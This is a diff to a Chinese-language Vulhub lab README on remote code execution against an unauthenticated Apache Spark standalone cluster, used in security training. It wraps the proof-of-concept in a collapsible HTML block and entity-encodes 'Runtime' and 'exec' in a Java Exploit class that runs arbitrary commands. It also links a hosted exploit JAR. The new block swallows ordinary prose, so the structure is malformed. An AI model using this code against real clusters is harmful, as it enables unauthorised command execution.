@@ -39,8 +39,10 @@ Vulhub 执行如下命令，将以 standalone 模式启动一个 Apache Spark �
 
 ```
 docker-compose up -d
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 环境启动后，访问 `http://your-ip:8080` 即可看到 master 的管理页面，访问 `http://your-ip:8081` 即可看到 slave 的管理页面。
 
 ## 漏洞利用
@@ -74,7 +76,7 @@ public class Exploit {
     StringBuilder output = new StringBuilder();
 
     try {
-      Process p = Runtime.getRuntime().exec(command);
+      Process p = &#82;untime.getRuntime().&#101;xec(command);
       p.waitFor();
       BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
 
@@ -88,8 +90,9 @@ public class Exploit {
 
     return output.toString();
   }
-}
-```
+}</code></pre>
+
+</details>
 
 将其编译成 JAR，放在任意一个 HTTP 或 FTP 上，如 `https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar`。
 
